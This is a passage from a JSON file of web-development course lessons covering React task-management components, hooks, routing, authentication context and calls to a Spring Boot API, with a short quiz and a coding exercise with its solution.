              "content": "The TaskList component displays tasks and provides filtering options. It demonstrates state management, conditional rendering, and component composition.\n\n```jsx\n// src/components/tasks/TaskList.jsx\nimport { useState, useEffect } from 'react';\nimport { taskService } from '../../services/taskService';\nimport TaskCard from './TaskCard';\nimport TaskFilters from './TaskFilters';\nimport LoadingSpinner from '../common/LoadingSpinner';\n\nexport default function TaskList() {\n  const [tasks, setTasks] = useState([]);\n  const [loading, setLoading] = useState(true);\n  const [error, setError] = useState(null);\n  const [filters, setFilters] = useState({\n    status: 'ALL',\n    priority: 'ALL',\n    search: '',\n  });\n\n  useEffect(() => {\n    loadTasks();\n  }, []);\n\n  async function loadTasks() {\n    try {\n      setLoading(true);\n      const response = await taskService.getTasks();\n      setTasks(response.content);\n      setError(null);\n    } catch (err) {\n      setError('Failed to load tasks. Please try again.');\n      console.error('Error loading tasks:', err);\n    } finally {\n      setLoading(false);\n    }\n  }\n\n  async function handleDelete(taskId) {\n    if (!window.confirm('Are you sure you want to delete this task?')) {\n      return;\n    }\n    try {\n      await taskService.deleteTask(taskId);\n      setTasks(tasks.filter(t => t.id !== taskId));\n    } catch (err) {\n      setError('Failed to delete task.');\n    }\n  }\n\n  // Apply filters client-side\n  const filteredTasks = tasks.filter(task => {\n    if (filters.status !== 'ALL' && task.status !== filters.status) {\n      return false;\n    }\n    if (filters.priority !== 'ALL' && task.priority !== filters.priority) {\n      return false;\n    }\n    if (filters.search && !task.title.toLowerCase().includes(filters.search.toLowerCase())) {\n      return false;\n    }\n    return true;\n  });\n\n  if (loading) {\n    return <LoadingSpinner />;\n  }\n\n  return (\n    <div className=\"space-y-6\">\n      <TaskFilters filters={filters} onFilterChange={setFilters} />\n      \n      {error && (\n        <div className=\"bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded\">\n          {error}\n        </div>\n      )}\n\n      {filteredTasks.length === 0 ? (\n        <div className=\"text-center py-12 text-gray-500\">\n          <p>No tasks found.</p>\n          <p className=\"text-sm\">Create your first task to get started!</p>\n        </div>\n      ) : (\n        <div className=\"grid gap-4 md:grid-cols-2 lg:grid-cols-3\">\n          {filteredTasks.map(task => (\n            <TaskCard \n              key={task.id} \n              task={task} \n              onDelete={() => handleDelete(task.id)}\n              onUpdate={loadTasks}\n            />\n          ))}\n        </div>\n      )}\n    </div>\n  );\n}\n\n// src/components/tasks/TaskFilters.jsx\nexport default function TaskFilters({ filters, onFilterChange }) {\n  return (\n    <div className=\"flex flex-wrap gap-4 p-4 bg-gray-50 rounded-lg\">\n      <div>\n        <label className=\"block text-sm font-medium text-gray-700 mb-1\">\n          Status\n        </label>\n        <select\n          value={filters.status}\n          onChange={(e) => onFilterChange({ ...filters, status: e.target.value })}\n          className=\"border rounded-md px-3 py-2\"\n        >\n          <option value=\"ALL\">All Statuses</option>\n          <option value=\"PENDING\">Pending</option>\n          <option value=\"IN_PROGRESS\">In Progress</option>\n          <option value=\"COMPLETED\">Completed</option>\n        </select>\n      </div>\n\n      <div>\n        <label className=\"block text-sm font-medium text-gray-700 mb-1\">\n          Priority\n        </label>\n        <select\n          value={filters.priority}\n          onChange={(e) => onFilterChange({ ...filters, priority: e.target.value })}\n          className=\"border rounded-md px-3 py-2\"\n        >\n          <option value=\"ALL\">All Priorities</option>\n          <option value=\"LOW\">Low</option>\n          <option value=\"MEDIUM\">Medium</option>\n          <option value=\"HIGH\">High</option>\n          <option value=\"URGENT\">Urgent</option>\n        </select>\n      </div>\n\n      <div className=\"flex-1 min-w-[200px]\">\n        <label className=\"block text-sm font-medium text-gray-700 mb-1\">\n          Search\n        </label>\n        <input\n          type=\"text\"\n          value={filters.search}\n          onChange={(e) => onFilterChange({ ...filters, search: e.target.value })}\n          placeholder=\"Search tasks...\"\n          className=\"w-full border rounded-md px-3 py-2\"\n        />\n      </div>\n    </div>\n  );\n}\n```"
            },
            {
              "type": "THEORY",
              "title": "TaskForm Component for Create and Edit",
              "content": "The TaskForm component handles both creating new tasks and editing existing ones. It demonstrates controlled form inputs, validation, and conditional behavior based on mode.\n\n```jsx\n// src/components/tasks/TaskForm.jsx\nimport { useState, useEffect } from 'react';\nimport { useNavigate, useParams } from 'react-router-dom';\nimport { taskService } from '../../services/taskService';\nimport { categoryService } from '../../services/categoryService';\n\nexport default function TaskForm() {\n  const { id } = useParams(); // If present, we're editing\n  const navigate = useNavigate();\n  const isEditMode = Boolean(id);\n\n  const [formData, setFormData] = useState({\n    title: '',\n    description: '',\n    status: 'PENDING',\n    priority: 'MEDIUM',\n    dueDate: '',\n    categoryId: '',\n  });\n  const [categories, setCategories] = useState([]);\n  const [errors, setErrors] = useState({});\n  const [loading, setLoading] = useState(false);\n  const [submitError, setSubmitError] = useState(null);\n\n  useEffect(() => {\n    loadCategories();\n    if (isEditMode) {\n      loadTask();\n    }\n  }, [id]);\n\n  async function loadCategories() {\n    try {\n      const data = await categoryService.getCategories();\n      setCategories(data);\n    } catch (err) {\n      console.error('Failed to load categories:', err);\n    }\n  }\n\n  async function loadTask() {\n    try {\n      const task = await taskService.getTask(id);\n      setFormData({\n        title: task.title,\n        description: task.description || '',\n        status: task.status,\n        priority: task.priority,\n        dueDate: task.dueDate || '',\n        categoryId: task.category?.id || '',\n      });\n    } catch (err) {\n      setSubmitError('Failed to load task.');\n    }\n  }\n\n  function handleChange(e) {\n    const { name, value } = e.target;\n    setFormData(prev => ({ ...prev, [name]: value }));\n    // Clear error when user starts typing\n    if (errors[name]) {\n      setErrors(prev => ({ ...prev, [name]: null }));\n    }\n  }\n\n  function validate() {\n    const newErrors = {};\n    if (!formData.title.trim()) {\n      newErrors.title = 'Title is required';\n    } else if (formData.title.length > 255) {\n      newErrors.title = 'Title must be less than 255 characters';\n    }\n    if (formData.description.length > 5000) {\n      newErrors.description = 'Description must be less than 5000 characters';\n    }\n    setErrors(newErrors);\n    return Object.keys(newErrors).length === 0;\n  }\n\n  async function handleSubmit(e) {\n    e.preventDefault();\n    if (!validate()) return;\n\n    setLoading(true);\n    setSubmitError(null);\n\n    const taskData = {\n      ...formData,\n      categoryId: formData.categoryId || null,\n      dueDate: formData.dueDate || null,\n    };\n\n    try {\n      if (isEditMode) {\n        await taskService.updateTask(id, taskData);\n      } else {\n        await taskService.createTask(taskData);\n      }\n      navigate('/tasks');\n    } catch (err) {\n      const message = err.response?.data?.detail || 'Failed to save task.';\n      setSubmitError(message);\n      \n      // Handle field-specific errors from server\n      if (err.response?.data?.errors) {\n        setErrors(err.response.data.errors);\n      }\n    } finally {\n      setLoading(false);\n    }\n  }\n\n  return (\n    <div className=\"max-w-2xl mx-auto\">\n      <h1 className=\"text-2xl font-bold mb-6\">\n        {isEditMode ? 'Edit Task' : 'Create New Task'}\n      </h1>\n\n      {submitError && (\n        <div className=\"bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-4\">\n          {submitError}\n        </div>\n      )}\n\n      <form onSubmit={handleSubmit} className=\"space-y-6\">\n        <div>\n          <label className=\"block text-sm font-medium text-gray-700 mb-1\">\n            Title *\n          </label>\n          <input\n            type=\"text\"\n            name=\"title\"\n            value={formData.title}\n            onChange={handleChange}\n            className={`w-full border rounded-md px-3 py-2 ${\n              errors.title ? 'border-red-500' : 'border-gray-300'\n            }`}\n            placeholder=\"Enter task title\"\n          />\n          {errors.title && (\n            <p className=\"text-red-500 text-sm mt-1\">{errors.title}</p>\n          )}\n        </div>\n\n        <div>\n          <label className=\"block text-sm font-medium text-gray-700 mb-1\">\n            Description\n          </label>\n          <textarea\n            name=\"description\"\n            value={formData.description}\n            onChange={handleChange}\n            rows={4}\n            className=\"w-full border border-gray-300 rounded-md px-3 py-2\"\n            placeholder=\"Enter task description (optional)\"\n          />\n        </div>\n\n        <div className=\"grid grid-cols-2 gap-4\">\n          <div>\n            <label className=\"block text-sm font-medium text-gray-700 mb-1\">\n              Status\n            </label>\n            <select\n              name=\"status\"\n              value={formData.status}\n              onChange={handleChange}\n              className=\"w-full border border-gray-300 rounded-md px-3 py-2\"\n            >\n              <option value=\"PENDING\">Pending</option>\n              <option value=\"IN_PROGRESS\">In Progress</option>\n              <option value=\"COMPLETED\">Completed</option>\n            </select>\n          </div>\n\n          <div>\n            <label className=\"block text-sm font-medium text-gray-700 mb-1\">\n              Priority\n            </label>\n            <select\n              name=\"priority\"\n              value={formData.priority}\n              onChange={handleChange}\n              className=\"w-full border border-gray-300 rounded-md px-3 py-2\"\n            >\n              <option value=\"LOW\">Low</option>\n              <option value=\"MEDIUM\">Medium</option>\n              <option value=\"HIGH\">High</option>\n              <option value=\"URGENT\">Urgent</option>\n            </select>\n          </div>\n        </div>\n\n        <div className=\"grid grid-cols-2 gap-4\">\n          <div>\n            <label className=\"block text-sm font-medium text-gray-700 mb-1\">\n              Due Date\n            </label>\n            <input\n              type=\"date\"\n              name=\"dueDate\"\n              value={formData.dueDate}\n              onChange={handleChange}\n              className=\"w-full border border-gray-300 rounded-md px-3 py-2\"\n            />\n          </div>\n\n          <div>\n            <label className=\"block text-sm font-medium text-gray-700 mb-1\">\n              Category\n            </label>\n            <select\n              name=\"categoryId\"\n              value={formData.categoryId}\n              onChange={handleChange}\n              className=\"w-full border border-gray-300 rounded-md px-3 py-2\"\n            >\n              <option value=\"\">No Category</option>\n              {categories.map(cat => (\n                <option key={cat.id} value={cat.id}>{cat.name}</option>\n              ))}\n            </select>\n          </div>\n        </div>\n\n        <div className=\"flex gap-4\">\n          <button\n            type=\"submit\"\n            disabled={loading}\n            className=\"bg-blue-600 text-white px-6 py-2 rounded-md hover:bg-blue-700 disabled:opacity-50\"\n          >\n            {loading ? 'Saving...' : (isEditMode ? 'Update Task' : 'Create Task')}\n          </button>\n          <button\n            type=\"button\"\n            onClick={() => navigate('/tasks')}\n            className=\"bg-gray-200 text-gray-700 px-6 py-2 rounded-md hover:bg-gray-300\"\n          >\n            Cancel\n          </button>\n        </div>\n      </form>\n    </div>\n  );\n}\n```"
            },
            {
              "type": "THEORY",
              "title": "useState and useEffect for State Management",
              "content": "React hooks are the foundation of functional component state management. Let us understand how to use them effectively.\n\nuseState - Managing Component State:\n```jsx\n// Basic state\nconst [count, setCount] = useState(0);\n\n// Object state\nconst [formData, setFormData] = useState({\n  title: '',\n  description: '',\n});\n\n// Updating object state (always create new object)\nsetFormData(prev => ({ ...prev, title: 'New Title' }));\n\n// Array state\nconst [tasks, setTasks] = useState([]);\n\n// Adding to array\nsetTasks(prev => [...prev, newTask]);\n\n// Removing from array\nsetTasks(prev => prev.filter(t => t.id !== taskId));\n\n// Updating item in array\nsetTasks(prev => prev.map(t => \n  t.id === taskId ? { ...t, status: 'COMPLETED' } : t\n));\n```\n\nuseEffect - Side Effects and Lifecycle:\n```jsx\n// Run once on mount (empty dependency array)\nuseEffect(() => {\n  loadInitialData();\n}, []);\n\n// Run when dependency changes\nuseEffect(() => {\n  if (searchTerm) {\n    searchTasks(searchTerm);\n  }\n}, [searchTerm]); // Re-runs when searchTerm changes\n\n// Cleanup function (runs on unmount or before re-run)\nuseEffect(() => {\n  const subscription = subscribeToUpdates();\n  \n  return () => {\n    subscription.unsubscribe(); // Cleanup\n  };\n}, []);\n\n// Multiple effects for different concerns\nuseEffect(() => {\n  loadTasks();\n}, []);\n\nuseEffect(() => {\n  loadCategories();\n}, []);\n```\n\nCommon Patterns:\n```jsx\n// Loading state pattern\nconst [data, setData] = useState(null);\nconst [loading, setLoading] = useState(true);\nconst [error, setError] = useState(null);\n\nuseEffect(() => {\n  async function fetchData() {\n    try {\n      setLoading(true);\n      const result = await api.getData();\n      setData(result);\n      setError(null);\n    } catch (err) {\n      setError(err.message);\n    } finally {\n      setLoading(false);\n    }\n  }\n  fetchData();\n}, []);\n\n// Conditional rendering based on state\nif (loading) return <Spinner />;\nif (error) return <Error message={error} />;\nif (!data) return <Empty />;\nreturn <DataDisplay data={data} />;\n```"
            },
            {
              "type": "THEORY",
              "title": "React Router v6 Setup with Routes",
              "content": "React Router provides client-side routing for single-page applications. Version 6 introduces simplified syntax and improved features.\n\n```jsx\n// src/App.jsx\nimport { BrowserRouter, Routes, Route, Navigate } from 'react-router-dom';\nimport { AuthProvider } from './context/AuthContext';\nimport ProtectedRoute from './components/common/ProtectedRoute';\nimport Layout from './components/layout/Layout';\nimport LoginPage from './pages/LoginPage';\nimport RegisterPage from './pages/RegisterPage';\nimport DashboardPage from './pages/DashboardPage';\nimport TasksPage from './pages/TasksPage';\nimport TaskForm from './components/tasks/TaskForm';\n\nexport default function App() {\n  return (\n    <BrowserRouter>\n      <AuthProvider>\n        <Routes>\n          {/* Public routes */}\n          <Route path=\"/login\" element={<LoginPage />} />\n          <Route path=\"/register\" element={<RegisterPage />} />\n\n          {/* Protected routes with layout */}\n          <Route element={<ProtectedRoute><Layout /></ProtectedRoute>}>\n            <Route path=\"/\" element={<Navigate to=\"/dashboard\" replace />} />\n            <Route path=\"/dashboard\" element={<DashboardPage />} />\n            <Route path=\"/tasks\" element={<TasksPage />} />\n            <Route path=\"/tasks/new\" element={<TaskForm />} />\n            <Route path=\"/tasks/:id/edit\" element={<TaskForm />} />\n          </Route>\n\n          {/* 404 fallback */}\n          <Route path=\"*\" element={<Navigate to=\"/\" replace />} />\n        </Routes>\n      </AuthProvider>\n    </BrowserRouter>\n  );\n}\n\n// src/components/common/ProtectedRoute.jsx\nimport { Navigate, useLocation } from 'react-router-dom';\nimport { useAuth } from '../../hooks/useAuth';\n\nexport default function ProtectedRoute({ children }) {\n  const { isAuthenticated, loading } = useAuth();\n  const location = useLocation();\n\n  if (loading) {\n    return <div>Loading...</div>;\n  }\n\n  if (!isAuthenticated) {\n    // Redirect to login, saving the attempted URL\n    return <Navigate to=\"/login\" state={{ from: location }} replace />;\n  }\n\n  return children;\n}\n\n// src/components/layout/Layout.jsx\nimport { Outlet } from 'react-router-dom';\nimport Header from './Header';\nimport Sidebar from './Sidebar';\n\nexport default function Layout() {\n  return (\n    <div className=\"min-h-screen bg-gray-100\">\n      <Header />\n      <div className=\"flex\">\n        <Sidebar />\n        <main className=\"flex-1 p-6\">\n          <Outlet /> {/* Child routes render here */}\n        </main>\n      </div>\n    </div>\n  );\n}\n\n// Navigation with useNavigate hook\nimport { useNavigate, Link } from 'react-router-dom';\n\nfunction TaskCard({ task }) {\n  const navigate = useNavigate();\n\n  return (\n    <div>\n      <h3>{task.title}</h3>\n      {/* Declarative navigation */}\n      <Link to={`/tasks/${task.id}/edit`}>Edit</Link>\n      \n      {/* Programmatic navigation */}\n      <button onClick={() => navigate(`/tasks/${task.id}/edit`)}>\n        Edit\n      </button>\n      \n      {/* Navigate back */}\n      <button onClick={() => navigate(-1)}>Go Back</button>\n    </div>\n  );\n}\n```\n\nRouter Features:\n- Nested routes with Layout pattern\n- Protected routes with redirect\n- Dynamic route params (:id)\n- Programmatic navigation with useNavigate\n- URL state preservation with useLocation"
            },
            {
              "type": "KEY_POINT",
              "title": "Authentication Context and Protected Routes",
              "content": "React Context provides global state without prop drilling. We use it to manage authentication state across the entire application.\n\n```jsx\n// src/context/AuthContext.jsx\nimport { createContext, useState, useEffect, useContext } from 'react';\nimport { authService } from '../services/authService';\n\nconst AuthContext = createContext(null);\n\nexport function AuthProvider({ children }) {\n  const [user, setUser] = useState(null);\n  const [loading, setLoading] = useState(true);\n\n  useEffect(() => {\n    // Check for existing session on mount\n    const token = localStorage.getItem('token');\n    const savedUser = localStorage.getItem('user');\n    \n    if (token && savedUser) {\n      setUser(JSON.parse(savedUser));\n    }\n    setLoading(false);\n  }, []);\n\n  async function login(email, password) {\n    const userData = await authService.login(email, password);\n    setUser(userData);\n    localStorage.setItem('user', JSON.stringify(userData));\n    return userData;\n  }\n\n  async function register(email, password, name) {\n    const userData = await authService.register(email, password, name);\n    setUser(userData);\n    localStorage.setItem('user', JSON.stringify(userData));\n    return userData;\n  }\n\n  function logout() {\n    authService.logout();\n    setUser(null);\n    localStorage.removeItem('user');\n  }\n\n  const value = {\n    user,\n    loading,\n    isAuthenticated: !!user,\n    login,\n    register,\n    logout,\n  };\n\n  return (\n    <AuthContext.Provider value={value}>\n      {children}\n    </AuthContext.Provider>\n  );\n}\n\n// src/hooks/useAuth.js\nimport { useContext } from 'react';\nimport { AuthContext } from '../context/AuthContext';\n\nexport function useAuth() {\n  const context = useContext(AuthContext);\n  if (!context) {\n    throw new Error('useAuth must be used within AuthProvider');\n  }\n  return context;\n}\n\n// Usage in components:\nimport { useAuth } from '../hooks/useAuth';\n\nfunction Header() {\n  const { user, logout, isAuthenticated } = useAuth();\n\n  return (\n    <header>\n      {isAuthenticated ? (\n        <>\n          <span>Welcome, {user.name}</span>\n          <button onClick={logout}>Logout</button>\n        </>\n      ) : (\n        <Link to=\"/login\">Login</Link>\n      )}\n    </header>\n  );\n}\n```\n\nContext Benefits:\n- Single source of truth for auth state\n- Any component can access auth without prop drilling\n- Centralized login/logout logic\n- Automatic re-render on auth state change"
            }
          ],
          "challenges": [
            {
              "type": "MULTIPLE_CHOICE",
              "id": "capstone-16-6-useeffect",
              "title": "useEffect Dependencies",
              "description": "Understand when useEffect re-runs based on dependencies.",
              "question": "You have: useEffect(() => { fetchTasks(filter); }, [filter]). When does fetchTasks get called?",
              "options": [
                {
                  "id": "a",
                  "text": "Only once when the component mounts",
                  "isCorrect": false
                },
                {
                  "id": "b",
                  "text": "On every render of the component",
                  "isCorrect": false
                },
                {
                  "id": "c",
                  "text": "On mount and whenever the filter value changes",
                  "isCorrect": true
                },
                {
                  "id": "d",
                  "text": "Never, because fetchTasks is not in the dependency array",
                  "isCorrect": false
                }
              ],
              "difficulty": "intermediate"
            },
            {
              "type": "FREE_CODING",
              "id": "capstone-16-6-task-card",
              "title": "Create TaskCard Component",
              "description": "Build a TaskCard component that displays task information with priority-based styling.",
              "instructions": "Create a TaskCard component that:\n1. Displays task title, status, priority, and due date\n2. Shows different background colors based on priority (URGENT=red, HIGH=orange, MEDIUM=yellow, LOW=green)\n3. Shows overdue indicator if due date is in the past and task is not completed\n4. Has Edit and Delete buttons that call the provided callbacks",
              "starterCode": "// Create the TaskCard component\n// Props: task, onEdit, onDelete\n\nexport default function TaskCard({ task, onEdit, onDelete }) {\n  // TODO: Implement the component\n}",
              "solution": "export default function TaskCard({ task, onEdit, onDelete }) {\n  const priorityColors = {\n    URGENT: 'bg-red-100 border-red-500',\n    HIGH: 'bg-orange-100 border-orange-500',\n    MEDIUM: 'bg-yellow-100 border-yellow-500',\n    LOW: 'bg-green-100 border-green-500',\n  };\n\n  const isOverdue = task.dueDate && \n    new Date(task.dueDate) < new Date() && \n    task.status !== 'COMPLETED';\n\n  return (\n    <div className={`border-l-4 rounded-lg p-4 shadow-sm ${priorityColors[task.priority]}`}>\n      <div className=\"flex justify-between items-start\">\n        <h3 className=\"font-semibold text-lg\">{task.title}</h3>\n        <span className={`text-xs px-2 py-1 rounded ${\n          task.status === 'COMPLETED' ? 'bg-green-500 text-white' :\n          task.status === 'IN_PROGRESS' ? 'bg-blue-500 text-white' :\n          'bg-gray-500 text-white'\n        }`}>\n          {task.status.replace('_', ' ')}\n        </span>\n      </div>\n\n      {task.description && (\n        <p className=\"text-gray-600 text-sm mt-2 line-clamp-2\">\n          {task.description}\n        </p>\n      )}\n\n      <div className=\"flex justify-between items-center mt-4\">\n        <div className=\"text-sm text-gray-500\">\n          {task.dueDate && (\n            <span className={isOverdue ? 'text-red-600 font-medium' : ''}>\n              {isOverdue && '⚠️ '}\n              Due: {new Date(task.dueDate).toLocaleDateString()}\n            </span>\n          )}\n        </div>\n\n        <div className=\"flex gap-2\">\n          <button\n            onClick={() => onEdit(task.id)}\n            className=\"text-blue-600 hover:text-blue-800 text-sm\"\n          >\n            Edit\n          </button>\n          <button\n            onClick={() => onDelete(task.id)}\n            className=\"text-red-600 hover:text-red-800 text-sm\"\n          >\n            Delete\n          </button>\n        </div>\n      </div>\n    </div>\n  );\n}",
              "language": "jsx",
              "testCases": [],
              "hints": [
                {
                  "level": 1,
                  "text": "Use an object to map priority values to Tailwind CSS classes for colors."
                },
                {
                  "level": 2,
                  "text": "Compare task.dueDate with new Date() to determine if overdue. Check task.status !== 'COMPLETED' to exclude completed tasks."
                }
              ],
              "difficulty": "intermediate"
            }
          ]
        },
        {
          "id": "capstone-lesson-7",
          "title": "Lesson 16.7: Frontend-Backend Integration",
          "moduleId": "module-16",
          "order": 7,
          "estimatedMinutes": 70,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "Connecting React to Spring Boot API",
              "content": "Now that we have both a fully functional Spring Boot backend and a React frontend, it is time to connect them. This integration is where the full-stack application truly comes together, allowing users to interact with your backend through a beautiful, responsive interface.\n\nThe connection between frontend and backend happens through HTTP requests. React makes requests to our Spring Boot REST API endpoints, receives JSON responses, and updates the UI accordingly. We already set up the Axios API service in lesson 16.6 - now we will ensure everything works seamlessly together.\n\nCORS Configuration Reminder:\nYour Spring Boot backend must allow requests from the React development server. In SecurityConfig, we configured CORS to allow http://localhost:5173 (Vite's default port). In production, you will update this to your actual frontend domain.\n\n```java\n// In SecurityConfig.java - CORS configuration\n@Bean\npublic CorsConfigurationSource corsConfigurationSource() {\n    CorsConfiguration configuration = new CorsConfiguration();\n    configuration.setAllowedOrigins(Arrays.asList(\n        \"http://localhost:5173\",\n        \"https://yourdomain.com\"\n    ));\n    configuration.setAllowedMethods(Arrays.asList(\"GET\", \"POST\", \"PUT\", \"DELETE\", \"OPTIONS\"));\n    configuration.setAllowedHeaders(Arrays.asList(\"*\"));\n    configuration.setAllowCredentials(true);\n    return new UrlBasedCorsConfigurationSource() {{\n        registerCorsConfiguration(\"/**\", configuration);\n    }};\n}\n```\n\nEnvironment Configuration:\nCreate a .env file in your frontend directory to configure the API URL:\n\n```bash\n# frontend/.env\nVITE_API_URL=http://localhost:8080/api\n```\n\nFor production, create .env.production:\n```bash\n# frontend/.env.production\nVITE_API_URL=https://api.yourdomain.com/api\n```\n\nVite automatically loads the correct file based on the build mode. When you run npm run build, it uses .env.production."
            },
            {
              "type": "THEORY",
              "title": "Authentication Flow: Login, JWT Storage, and Session Management",
              "content": "The authentication flow is the foundation of our secure application. Let us trace exactly what happens when a user logs in, how their session is maintained, and how they log out.\n\nLogin Flow Step by Step:\n\n1. User enters email and password on LoginPage\n2. React calls authService.login(email, password)\n3. Axios POSTs to /api/auth/login\n4. Spring Boot validates credentials against database\n5. If valid, generates JWT token and returns it\n6. React stores token in localStorage\n7. React stores user info in AuthContext state\n8. React redirects to dashboard\n\n```jsx\n// src/pages/LoginPage.jsx\nimport { useState } from 'react';\nimport { useNavigate, useLocation, Link } from 'react-router-dom';\nimport { useAuth } from '../hooks/useAuth';\n\nexport default function LoginPage() {\n  const [email, setEmail] = useState('');\n  const [password, setPassword] = useState('');\n  const [error, setError] = useState('');\n  const [loading, setLoading] = useState(false);\n  \n  const { login } = useAuth();\n  const navigate = useNavigate();\n  const location = useLocation();\n  \n  // Where to redirect after login (default: dashboard)\n  const from = location.state?.from?.pathname || '/dashboard';\n\n  async function handleSubmit(e) {\n    e.preventDefault();\n    setError('');\n    setLoading(true);\n\n    try {\n      await login(email, password);\n      navigate(from, { replace: true });\n    } catch (err) {\n      if (err.response?.status === 401) {\n        setError('Invalid email or password');\n      } else if (err.response?.status === 400) {\n        setError(err.response.data.detail || 'Invalid input');\n      } else {\n        setError('Login failed. Please try again.');\n      }\n    } finally {\n      setLoading(false);\n    }\n  }\n\n  return (\n    <div className=\"min-h-screen flex items-center justify-center bg-gray-100\">\n      <div className=\"bg-white p-8 rounded-lg shadow-md w-full max-w-md\">\n        <h1 className=\"text-2xl font-bold text-center mb-6\">Login</h1>\n        \n        {error && (\n          <div className=\"bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-4\">\n            {error}\n          </div>\n        )}\n\n        <form onSubmit={handleSubmit} className=\"space-y-4\">\n          <div>\n            <label className=\"block text-sm font-medium text-gray-700 mb-1\">\n              Email\n            </label>\n            <input\n              type=\"email\"\n              value={email}\n              onChange={(e) => setEmail(e.target.value)}\n              required\n              className=\"w-full border border-gray-300 rounded-md px-3 py-2\"\n              placeholder=\"you@example.com\"\n            />\n          </div>\n\n          <div>\n            <label className=\"block text-sm font-medium text-gray-700 mb-1\">\n              Password\n            </label>\n            <input\n              type=\"password\"\n              value={password}\n              onChange={(e) => setPassword(e.target.value)}\n              required\n              className=\"w-full border border-gray-300 rounded-md px-3 py-2\"\n              placeholder=\"Enter your password\"\n            />\n          </div>\n\n          <button\n            type=\"submit\"\n            disabled={loading}\n            className=\"w-full bg-blue-600 text-white py-2 rounded-md hover:bg-blue-700 disabled:opacity-50\"\n          >\n            {loading ? 'Signing in...' : 'Sign In'}\n          </button>\n        </form>\n\n        <p className=\"text-center mt-4 text-gray-600\">\n          Do not have an account?{' '}\n          <Link to=\"/register\" className=\"text-blue-600 hover:underline\">\n            Register\n          </Link>\n        </p>\n      </div>\n    </div>\n  );\n}\n```\n\nToken Storage Strategy:\nWe store the JWT in localStorage for persistence across browser sessions. The Axios interceptor automatically attaches it to every request. When the token expires (401 response), the interceptor clears storage and redirects to login."
            },
            {
              "type": "THEORY",
              "title": "Protected Routes in React",
              "content": "Protected routes ensure that unauthenticated users cannot access restricted pages. When someone tries to visit /dashboard without logging in, they are redirected to /login. After successful login, they return to their originally intended destination.\n\nThe ProtectedRoute Component:\n\n```jsx\n// src/components/common/ProtectedRoute.jsx\nimport { Navigate, useLocation } from 'react-router-dom';\nimport { useAuth } from '../../hooks/useAuth';\nimport LoadingSpinner from './LoadingSpinner';\n\nexport default function ProtectedRoute({ children }) {\n  const { isAuthenticated, loading } = useAuth();\n  const location = useLocation();\n\n  // Show loading while checking auth status\n  if (loading) {\n    return (\n      <div className=\"min-h-screen flex items-center justify-center\">\n        <LoadingSpinner size=\"large\" />\n      </div>\n    );\n  }\n\n  // Not authenticated - redirect to login\n  if (!isAuthenticated) {\n    // Save the attempted URL for redirect after login\n    return <Navigate to=\"/login\" state={{ from: location }} replace />;\n  }\n\n  // Authenticated - render the protected content\n  return children;\n}\n```\n\nUsage in App.jsx:\n\n```jsx\n// src/App.jsx\nimport { BrowserRouter, Routes, Route, Navigate } from 'react-router-dom';\nimport { AuthProvider } from './context/AuthContext';\nimport ProtectedRoute from './components/common/ProtectedRoute';\nimport Layout from './components/layout/Layout';\nimport LoginPage from './pages/LoginPage';\nimport RegisterPage from './pages/RegisterPage';\nimport DashboardPage from './pages/DashboardPage';\nimport TasksPage from './pages/TasksPage';\nimport TaskFormPage from './pages/TaskFormPage';\nimport CategoriesPage from './pages/CategoriesPage';\n\nexport default function App() {\n  return (\n    <BrowserRouter>\n      <AuthProvider>\n        <Routes>\n          {/* Public routes - accessible without login */}\n          <Route path=\"/login\" element={<LoginPage />} />\n          <Route path=\"/register\" element={<RegisterPage />} />\n\n          {/* Protected routes - require authentication */}\n          <Route\n            element={\n              <ProtectedRoute>\n                <Layout />\n              </ProtectedRoute>\n            }\n          >\n            <Route path=\"/\" element={<Navigate to=\"/dashboard\" replace />} />\n            <Route path=\"/dashboard\" element={<DashboardPage />} />\n            <Route path=\"/tasks\" element={<TasksPage />} />\n            <Route path=\"/tasks/new\" element={<TaskFormPage />} />\n            <Route path=\"/tasks/:id/edit\" element={<TaskFormPage />} />\n            <Route path=\"/categories\" element={<CategoriesPage />} />\n          </Route>\n\n          {/* Catch-all redirect */}\n          <Route path=\"*\" element={<Navigate to=\"/\" replace />} />\n        </Routes>\n      </AuthProvider>\n    </BrowserRouter>\n  );\n}\n```\n\nThe key concepts here are:\n- Nested routes with a Layout wrapper\n- The Outlet component in Layout renders child routes\n- location.state preserves the intended URL for post-login redirect\n- Loading state prevents flash of login page during auth check"
            },
            {
              "type": "THEORY",
              "title": "Full CRUD Operations from UI",
              "content": "Let us implement all CRUD (Create, Read, Update, Delete) operations for tasks, connecting each UI action to our Spring Boot API.\n\nThe Complete Task Service:\n\n```javascript\n// src/services/taskService.js\nimport api from './api';\n\nexport const taskService = {\n  // READ - Get all tasks with pagination and filtering\n  async getTasks({ page = 0, size = 20, status, priority, categoryId, search } = {}) {\n    const params = new URLSearchParams();\n    params.append('page', page);\n    params.append('size', size);\n    if (status) params.append('status', status);\n    if (priority) params.append('priority', priority);\n    if (categoryId) params.append('categoryId', categoryId);\n    if (search) params.append('search', search);\n    \n    const response = await api.get(`/tasks?${params}`);\n    return response.data;\n  },\n\n  // READ - Get single task by ID\n  async getTask(id) {\n    const response = await api.get(`/tasks/${id}`);\n    return response.data;\n  },\n\n  // CREATE - Create new task\n  async createTask(taskData) {\n    const response = await api.post('/tasks', taskData);\n    return response.data;\n  },\n\n  // UPDATE - Update existing task\n  async updateTask(id, taskData) {\n    const response = await api.put(`/tasks/${id}`, taskData);\n    return response.data;\n  },\n\n  // UPDATE - Quick status toggle\n  async toggleComplete(id, currentStatus) {\n    const newStatus = currentStatus === 'COMPLETED' ? 'PENDING' : 'COMPLETED';\n    const response = await api.patch(`/tasks/${id}/status`, { status: newStatus });\n    return response.data;\n  },\n\n  // DELETE - Remove task\n  async deleteTask(id) {\n    await api.delete(`/tasks/${id}`);\n  },\n};\n```\n\nUsing the Service in Components:\n\n```jsx\n// src/pages/TasksPage.jsx\nimport { useState, useEffect, useCallback } from 'react';\nimport { Link } from 'react-router-dom';\nimport { taskService } from '../services/taskService';\nimport TaskList from '../components/tasks/TaskList';\nimport TaskFilters from '../components/tasks/TaskFilters';\nimport LoadingSpinner from '../components/common/LoadingSpinner';\n\nexport default function TasksPage() {\n  const [tasks, setTasks] = useState([]);\n  const [loading, setLoading] = useState(true);\n  const [error, setError] = useState(null);\n  const [pagination, setPagination] = useState({ page: 0, totalPages: 0 });\n  const [filters, setFilters] = useState({});\n\n  const loadTasks 